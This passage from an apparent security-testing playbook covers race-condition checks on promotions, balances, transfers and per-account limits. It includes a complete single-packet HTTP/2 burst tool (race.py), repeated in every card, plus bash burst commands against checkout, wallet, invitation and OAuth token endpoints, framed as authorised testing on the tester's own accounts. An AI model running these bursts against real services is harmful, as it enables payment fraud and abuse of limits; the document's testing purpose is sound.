    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-002"; mkdir -p "$D"; CT='Content-Type: application/json'
  C1='<a single-use code we hold>'; C2='<a second unused code of the same promotion>'
  st(){ curl -sS "${HDR[@]}" $A "$T/api/account/credits" -o "$D/state-$1.json"; printf '%s: ' "$1"
        grep -Eo '"(balance|credits|points|premium_until|redemptions|uses)"\s*:\s*"?[^,}"]+' "$D/state-$1.json" | tr '\n' ' '; echo; }
  st 0-before
  # 1. control: one code twice, a second apart; the second must be refused
  for i in 1 2; do curl -sS "${HDR[@]}" $A -X POST "$T/api/promotions/redeem" -H "$CT" -d "{\"code\":\"$C1\"}" \
    -o "$D/control-$i.json" -w "control $i: %{http_code}\n"; sleep 1; done; st 1-after-control
  # 2. the burst: the fresh code twenty times in one packet (add --each "$E/tools/sessions-A.txt" after a session lock
  #    in RAC-001; add --h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" --warm / -n 20 --out "$D/burst-1" \
    -- POST "$T/api/promotions/redeem" "{\"code\":\"$C2\"}" | tee "$D/burst-1.txt"
  st 2-after-burst
  # 3. a code applied to a cart: twenty applies, then the amount the payment session would charge (nothing is paid)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -n 20 -- POST "$T/api/cart/coupons" '{"code":"<another code we hold>"}' | tee "$D/burst-cart.txt"
  curl -sS "${HDR[@]}" $A "$T/api/cart" | grep -Eo '"(discounts?|discount_total|subtotal|total)"\s*:\s*[^,}]+'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/checkout/session" -H "$CT" -d '{"cart_id":"<cart id>"}' | grep -Eo '"(amount|amount_total|total)"\s*:\s*"?-?[0-9.]+'
  # 4. the rate: step 2 again with a fresh code each time, five bursts at most; keep every burst-N.txt
  ```
- **Proof:** the benefit in our account granted more than once for one code or one claim: the state before, the
  burst output with more than one success, the state after, the rule as the product words it ("one use per
  customer"), and the rate over the runs ("3 of 4 bursts granted 2 to 5 uses"). For a cart, the discount lines and
  the payment-session amount, with no purchase made. Nothing granted is spent; the report states the extra value.
- **Not a finding when:** several `200` answers and one grant in the account (the handler is idempotent or replays
  its first result); the promotion allows several uses per account or per order; each request created its own
  pending order that never completes; the extra grants disappear after the stated settlement time or overnight
  (read the state again before reporting); the extra value came from extra accounts of ours, which is
  multi-accounting, not a race; the policy excludes promotions (`promo-abuse`), in which case the planner has
  already closed this card.
- **Escalate:** the sequential forms (replay, undo and redo, the code in another case, stacking) are BIZ-005 and
  BIZ-006: one root cause, one report. Stored value, gift cards and wallets are RAC-003. On GraphQL, aliases or an
  array batch put the twenty claims in one request (GQL-007). Credit that can be withdrawn: describe the path to
  money, never use it.

### RAC-003 · One balance, gift card or credit is spent, transferred or withdrawn twice by requests released in one packet

| | |
|---|---|
| **Severity** | High standalone when money-equivalent value (store credit, gift card, wallet, payout) is spent or moved twice; Medium for points or credits that cannot leave the platform |
| **Requires** | payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') · CWE-362 |
| **Prior art** | #759247, #1438052, #974892, #801743 |

- **Where:** every request that consumes a balance: paying with store credit or a gift-card balance, redeeming a
  gift card into the wallet, transferring credits or points between our own accounts or into our own
  organisation, buying with points in a reward shop, a faucet or daily allowance, a payout or withdrawal request,
  a purchase receipt verified for in-app coins. It needs value in our account: free credits or points, a test
  gift card or balance the programme provides, or a top-up made with test cards or an approved purchase
  (`purchase`); with none, mark the card `skipped` with that reason. The transfer form needs B; the others need
  only A. Withdrawals run only in a sandbox, in a test mode or between internal wallets of ours, never towards an
  external account in production.
- **Test:** the balance check and the debit are separate statements: the application reads the balance, compares,
  and writes the new balance it computed itself. Requests released together all read the old balance and all
  pass. Spend an amount the balance covers once, twenty times in one packet, then read both sides. The
  multi-endpoint form: confirm a payment and add an item to the cart in one packet, so the order is built from a
  cart larger than the one the payment was checked against.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths. A transfer from A to B, both ours, is the cleanest proof.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-003"; mkdir -p "$D"; CT='Content-Type: application/json'
  AMT='<A balance, whole>'; IDA='<A wallet or account id>'; IDB='<B wallet or account id>'
  w(){ curl -sS "${HDR[@]}" $1 "$T/api/wallet" | grep -Eo '"(balance|credits|points)"\s*:\s*"?-?[0-9.]+' | tr '\n' ' '; }
  bal(){ echo "$1: A $(w "$A") | B $(w "$B")" | tee -a "$D/balances.txt"; }
  xfer(){ curl -sS "${HDR[@]}" $1 -X POST "$T/api/wallet/transfer" -H "$CT" -d "{\"to\":\"$2\",\"amount\":$AMT}" -o /dev/null -w "$3: %{http_code}\n"; }
  bal 0-before
  # 1. control: A sends its whole balance to B twice, a second apart; the second must be refused. Then B sends it back
  xfer "$A" "$IDB" control-1; sleep 1; xfer "$A" "$IDB" control-2; bal 1-after-control; xfer "$B" "$IDA" back; bal 2-reset
  # 2. the burst: twenty transfers of the whole balance in one packet, each with its own idempotency key
  #    (--each after a session lock in RAC-001; --h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -H 'Idempotency-Key: rac003-{i}' --warm / -n 20 --out "$D/burst-1" \
    -- POST "$T/api/wallet/transfer" "{\"to\":\"$IDB\",\"amount\":$AMT}" | tee "$D/burst-1.txt"
  bal 3-after-burst
  # 3. a gift card we own redeemed into the wallet twenty times; the wallet must rise by the card's value once
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -n 20 -- POST "$T/api/gift-cards/redeem" '{"code":"<gift card code we own>"}' | tee "$D/burst-giftcard.txt"
  bal 4-after-giftcard
  # 4. multi-endpoint: a store-credit payment confirmed in the same packet as an added item (cheapest digital item;
  #    cancel the order afterwards)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" \
    -- 1 POST "$T/api/checkout/confirm" '{"cart_id":"<cart id>","payment_method":"store_credit"}' \
    -- 1 POST "$T/api/cart/items" '{"product_id":"<cheapest digital item>","quantity":1}' | tee "$D/burst-cart.txt"
  curl -sS "${HDR[@]}" $A "$T/api/orders?limit=1" -o "$D/last-order.json"; grep -Eo '"(total|amount_paid|quantity|product_id)"\s*:\s*"?[^,}"]+' "$D/last-order.json"
  # put the value back where it started (B to A) and record every order and transfer in cleanup.md
  ```
- **Proof:** the balances before and after on both sides (`balances.txt`): A debited once and B credited several
  times, or A below zero; a wallet credited more than the gift card's value; or an order holding an item the
  payment did not cover. With the burst output and the rate over the runs. Nothing leaves the platform; the report
  lists the extra value for reversal.
- **Not a finding when:** a balance view that lags and settles to the right value (read it again after a minute);
  extra transfers shown as pending and rejected at settlement; extra orders cancelled by a fraud or reconciliation
  job before fulfilment (say so: the rating drops); an idempotency key the client always sends unchanged, which
  deduplicates the burst by design (each request needs its own, as above); an item added during checkout that
  landed in a new cart, not in the paid order.
- **Escalate:** a refund of one of the duplicated purchases is BIZ-010; an order activated from a cart larger than
  the payment is BIZ-007. Coins inflated through a purchase-verification endpoint (#801743) are the same burst
  sent to that endpoint with one receipt of ours. Transfers into another tenant's wallet: BAC chapter. Describe how
  the extra value turns into money; never turn it.

### RAC-004 · An action limited to N per account, plan or object succeeds more than N times when the requests arrive in one packet

| | |
|---|---|
| **Severity** | Low standalone for an unpriced limit (votes, likes, follows, invitations sent); Medium when the limit is a priced unit (seats, workspaces, projects, API keys); High when the limit is itself a security control (a cap on verifications per person, the one membership that a removal must end) |
| **Requires** | limited-action\|quota\|invite, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Time-of-check Time-of-use (TOCTOU) Race Condition · CWE-367 |
| **Prior art** | #2110030, #413759, #1540969, #996141 |

- **Where:** every stated "at most N": plan limits (seats, workspaces, projects, locations, custom domains, API
  keys, webhooks, monitored addresses, folders), invitations sent against a seat count, one-per-user interactions
  on our own content (vote, like and unlike, rating, review, follow, poll answer), group sizes, an invitation
  accepted once per person, and single-use codes such as an OAuth authorization code of our own test client on an
  `oauth-provider` asset. The limits are on the pricing page, in usage views and in refusal messages. No stated
  limit anywhere: mark the card `skipped`. The acceptance step needs B.
- **Test:** the handler counts the existing rows, compares with the limit, then inserts. Without a lock or a unique
  constraint, creates released together all count the same number. Bring the resource to one below the limit,
  release twenty creates with distinct names, and count what exists.
- **How:** the first block is the same in every RAC card; the second holds this card's steps, with the saved
  requests in place of the example paths.
  ```bash
  # 0. race.py and sessions(): this block is the same in every RAC card; race.py is written once per engagement
  mkdir -p "$E/tools"; [ -s "$E/tools/race.py" ] || cat > "$E/tools/race.py" <<'PY'
  # race.py: release up to 50 requests together and print what each returned (needs: python3 -m pip install --user h2).
  # HTTP/2 (default) is the single-packet attack: all requests go out but their last byte, a PING round trip shows the server
  # has read them, then every last byte leaves in one write. --h1 is last-byte sync: one connection per request.
  # race.py [-n 20] [--h1] [--warm PATH] [--stagger MS] [--each FILE] [--out DIR] [-k] [curl -A/-H args] -- [COUNT] METHOD URL [BODY|@file] [-- ...]
  # Templates without COUNT repeat in turn up to -n; {i} (URL, body, header) is the request number; --each gives request i the header on line i
  # of FILE (a session per request); --stagger releases them MS ms apart. Afterwards it sleeps n/$RATE s for the rate limit.
  import os, re, socket, ssl, sys, threading, time
  from collections import Counter
  from urllib import parse
  a, o, fl, hd = sys.argv[1:], {'-n': '20', '--warm': '', '--stagger': '0', '--each': '', '--out': '', '--timeout': '20'}, set(), []
  while a and a[0] != '--':
      k = a.pop(0)
      if k in ('--h1', '-k'): fl.add(k); continue
      if k not in o and k not in ('-A', '-H'): sys.exit('race.py: unknown option ' + k)
      v = a.pop(0)
      if k in o: o[k] = v; continue
      for ln in ['User-Agent: ' + v] if k == '-A' else open(v[1:]).read().splitlines() if v[:1] == '@' else [v]:
          n, _, w = ln.partition(':')
          if n.strip() and w.strip(): hd.append((n.strip().lower(), w.strip()))
  tpl, cnt = [t.split('\0') for t in '\0'.join(a[1:]).split('\0--\0') if t], lambda t: int(t[0]) if t[0].isdigit() else 0
  seq = [t[1:] if cnt(t) else t for t in tpl for _ in range(cnt(t) or 1)] if any(map(cnt, tpl)) else [tpl[i % len(tpl)] for i in range(int(o['-n']) * bool(tpl))]
  if not 0 < len(seq) <= 50: sys.exit('race.py: give 1 to 50 requests after --; more is load, not a race')
  each, R = [x for x in open(o['--each']) if ':' in x] if o['--each'] else [], []
  DROP = {'host', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'content-length'}
  for i, t in enumerate(seq):
      b, h = t[2] if len(t) > 2 else '', list(hd)
      b = (open(b[1:], 'rb').read() if b[:1] == '@' else b.encode()).replace(b'{i}', str(i).encode())
      if each: n, _, w = each[i % len(each)].partition(':'); h = [x for x in h if x[0] != n.strip().lower()] + [(n.strip().lower(), w.strip())]
      R.append((t[0].upper(), parse.urlsplit(t[1].replace('{i}', str(i))), [(k, v.replace('{i}', str(i))) for k, v in h if k not in DROP], b))
  u0, N, res = R[0][1], len(R), [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in R]
  if any(r[1][:2] != u0[:2] for r in R): sys.exit('race.py: all requests must go to one origin')
  TLS, TO, RATE, GAP = (u0.scheme == 'https'), float(o['--timeout']), float(os.environ.get('RATE') or 1), float(o['--stagger']) / 1000
  def path(u): return (u[2] or '/') + ('?' + u[3] if u[3] else '')  # path and query of a split URL
  def conn(alpn):
      s = socket.create_connection((u0.hostname, (u0.port or (443 if TLS else 80))), timeout=TO)
      s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
      if not TLS: return s
      cx = ssl.create_default_context(); cx.set_alpn_protocols([alpn])
      if '-k' in fl: cx.check_hostname, cx.verify_mode = False, ssl.CERT_NONE
      return cx.wrap_socket(s, server_hostname=u0.hostname)
  def h2run():
      from h2 import config, connection, events as ev
      s = conn('h2')
      if TLS and s.selected_alpn_protocol() != 'h2': sys.exit('race.py: the server did not negotiate HTTP/2: use --h1')
      c = connection.H2Connection(config.H2Configuration(client_side=True, header_encoding='utf-8'))
      c.initiate_connection(); s.sendall(c.data_to_send()); rec, flag = {}, set()
      def pump(done, limit):
          end = time.time() + limit
          while not done() and time.time() < end and 'gone' not in flag:
              s.settimeout(max(0.05, end - time.time()))
              try: data = s.recv(65536)
              except (socket.timeout, TimeoutError): break
              if not data: flag.add('gone'); break
              for e in c.receive_data(data):
                  r = rec.get(getattr(e, 'stream_id', None))
                  if isinstance(e, ev.ResponseReceived) and r: r.update(t1=time.time(), hd=e.headers, st=dict(e.headers)[':status'])
                  elif isinstance(e, ev.DataReceived):
                      if r: r['body'] += bytes(e.data)
                      c.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                  elif isinstance(e, ev.StreamEnded) and r: r['t2'] = time.time()
                  elif isinstance(e, ev.StreamReset) and r: r.update(t2=time.time(), st='RST')
                  elif isinstance(e, ev.PingAckReceived): flag.add('pong')
                  elif isinstance(e, ev.RemoteSettingsChanged): flag.add('settings')
                  elif isinstance(e, ev.ConnectionTerminated): flag.add('gone')
              s.sendall(c.data_to_send())
      def start(m, u, h, b, r, end=False):
          sid, cl = c.get_next_available_stream_id(), [('content-length', str(len(b)))] if b or m in ('POST', 'PUT', 'PATCH') else []
          rec[sid] = r; c.send_headers(sid, [(':method', m), (':authority', u.netloc), (':scheme', u.scheme), (':path', path(u))] + h + cl, end_stream=end)
          return sid
      def data(sid, b, end):
          mx = c.max_outbound_frame_size; ch = [b[j:j + mx] for j in range(0, len(b), mx)] or [b'']
          for j, x in enumerate(ch):
              if x or end: c.send_data(sid, x, end_stream=end and j == len(ch) - 1)
      pump(lambda: 'settings' in flag, 5)
      if 'settings' not in flag: sys.exit('race.py: no HTTP/2 SETTINGS frame from the server: use --h1')
      if o['--warm']:  # three GETs on this connection first, so that the burst does not pay for a cold connection
          w = [dict(st='-', hd=[], body=b'', t0=0, t1=0, t2=0) for _ in range(3)]
          for r in w: start('GET', u0._replace(path=o['--warm'], query=''), [x for x in hd if x[0] not in DROP], b'', r, True)
          s.sendall(c.data_to_send()); pump(lambda: all(r['t2'] for r in w), TO)
      if sum(len(x[3]) for x in R) > 60000: sys.exit('race.py: the bodies exceed one flow-control window: keep them small')
      sids = [start(*x, r) for x, r in zip(R, res)]
      for sid, x in zip(sids, R): data(sid, x[3][:-1], False)
      s.sendall(c.data_to_send()); c.ping(b'race.py!'); s.sendall(c.data_to_send()); pump(lambda: 'pong' in flag, 5)
      last = []
      for sid, x in zip(sids, R): data(sid, x[3][-1:], True); last.append(c.data_to_send())
      if GAP:
          for q, r in zip(last, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      else:
          t0 = time.time(); s.sendall(b''.join(last))
          for r in res: r['t0'] = t0
      pump(lambda: all(r['t2'] for r in res), TO)
  def h1run():
      def rd(s, r):
          buf = b''
          while True:
              try: x = s.recv(65536)
              except OSError: break
              if not x: break
              buf, r['t1'] = buf + x, r['t1'] or time.time()
          head, _, r['body'] = buf.partition(b'\r\n\r\n'); ln = head.decode('latin-1').split('\r\n')
          r.update(t2=time.time(), st=(ln[0].split(' ') + ['-', '-'])[1], hd=[tuple(x.split(': ', 1)) for x in ln[1:] if ': ' in x])
      socks = []
      for m, u, h, b in R:
          ln = ['%s %s HTTP/1.1' % (m, path(u)), 'host: ' + u.netloc] + ['%s: %s' % x for x in h] + ['connection: close']
          q = ('\r\n'.join(ln + (['content-length: %d' % len(b)] if b or m in ('POST', 'PUT', 'PATCH') else [])) + '\r\n\r\n').encode() + b
          s = conn('http/1.1'); s.sendall(q[:-1]); socks.append((s, q[-1:]))
      th = [threading.Thread(target=rd, args=(s, r)) for (s, _), r in zip(socks, res)]
      for t in th: t.start()
      time.sleep(0.3)  # HTTP/1.1 has no PING: give the partial requests time to arrive
      for (s, q), r in zip(socks, res): r['t0'] = time.time(); s.sendall(q); time.sleep(GAP)
      for t in th: t.join(TO)
  h1run() if '--h1' in fl else h2run()
  print('# %d requests released %s over %s, %s' % (N, '%s ms apart' % o['--stagger'] if GAP else 'together', 'HTTP/1.1' if '--h1' in fl else 'HTTP/2', time.strftime('%H:%M:%S')))
  seen = Counter()
  for i, ((m, u, h, b), r) in enumerate(zip(R, res)):
      snip, ms = re.sub(r'\s+', ' ', r['body'][:100].decode('utf-8', 'replace')), '%8.1f' % ((r['t1'] - r['t0']) * 1000) if r['t1'] else '       -'
      print('%3d %-4s %7d %s ms  %s %s  %s' % (i, r['st'], len(r['body']), ms, m, path(u)[:40], snip[:70]))
      seen[(r['st'], re.sub(r'[0-9a-f]{8,}|\d+', '#', snip[:60]))] += 1
      if o['--out']:
          os.makedirs(o['--out'], exist_ok=True); hh = ''.join('%s: %s\n' % x for x in r['hd'])
          open(os.path.join(o['--out'], '%02d.txt' % i), 'wb').write(('%s %s\n' % (m, u.geturl())).encode() + b + ('\n\n%s\n%s\n' % (r['st'], hh)).encode() + r['body'])
  print('# outcomes (digits and hex ids folded):')
  for k, v in seen.most_common(): print('%5d x %-4s %s' % (v, k[0], k[1]))
  print('# ms from release to first response byte, sorted: ' + ' '.join('%.0f' % x for x in sorted((r['t1'] - r['t0']) * 1000 for r in res if r['t1'])))
  time.sleep(N / RATE)
  PY
  # sessions FILE PATH BODY: twenty logins with the saved login request, one Cookie line per session, for race.py --each FILE
  sessions(){ for i in $(seq 1 20); do curl -sS "${HDR[@]}" -c "$1.jar" -o /dev/null -X POST "$T$2" -H "Content-Type: ${LOGIN_CT:-application/json}" -d "$3"
    printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$1.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')"; rm -f "$1.jar"; sleep 1; done > "$1"; }
  ```
  ```bash
  D="$E/evidence/$H/RAC-004"; mkdir -p "$D"; CT='Content-Type: application/json'; FREE=3   # how many more the plan allows now
  cnt(){ curl -sS "${HDR[@]}" $A "$T/api/projects" -o "$D/list-$1.json"; echo "$1: $(grep -o '"id"' "$D/list-$1.json" | wc -l) objects"; }
  mk(){ curl -sS "${HDR[@]}" $A -X POST "$T/api/projects" -H "$CT" -d "{\"name\":\"rac004-$1\"}" -o "$D/create-$1.json" -w "create $1: %{http_code}\n"; sleep 1; }
  cnt 0-start
  # 1. fill to the limit one at a time; the next one is the control and must be refused; then delete one (one free)
  for i in $(seq 1 "$FREE"); do mk "fill-$i"; done; mk control; cnt 1-at-limit
  curl -sS "${HDR[@]}" $A -X DELETE "$T/api/projects/<id of rac004-fill-1>" -o /dev/null -w 'delete: %{http_code}\n'
  # 2. twenty creates with distinct names in one packet (--each after a session lock in RAC-001; --h1 without HTTP/2)
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" --warm / -n 20 --out "$D/burst-1" -- POST "$T/api/projects" '{"name":"rac004-burst-{i}"}' | tee "$D/burst-1.txt"
  cnt 2-after-burst
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/projects/<id of an extra object>" -H "$CT" -d '{"description":"rac004"}' -o /dev/null -w 'write to an extra object: %{http_code}\n'
  # 3. seats: twenty invitations to our own aliases while one seat is free; then the seat and invitation counts
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -n 20 -- POST "$T/api/team/invitations" '{"email":"<our mailbox>+rac004-{i}@<our domain>","role":"member"}' | tee "$D/burst-invite.txt"
  # 4. one per user: twenty votes by A on our own post, then its count
  python3 "$E/tools/race.py" "${HDR[@]}" $A -H "$CT" -n 20 -- POST "$T/api/posts/<our own post id>/vote" '{"value":1}' | tee "$D/burst-vote.txt"
  curl -sS "${HDR[@]}" $A "$T/api/posts/<our own post id>" | grep -Eo '"(votes|score|likes)"\s*:\s*-?[0-9]+'
  # 5. on an OAuth provider: one authorization code of our own test client exchanged twenty times; count the tokens
  python3 "$E/tools/race.py" "${HDR[@]}" -H 'Content-Type: application/x-www-form-urlencoded' -n 20 --out "$D/burst-code" \
    -- POST "$T/oauth/token" 'grant_type=authorization_code&code=<code>&redirect_uri=<registered uri>&client_id=<id>&client_secret=<secret>' | tee "$D/burst-code.txt"
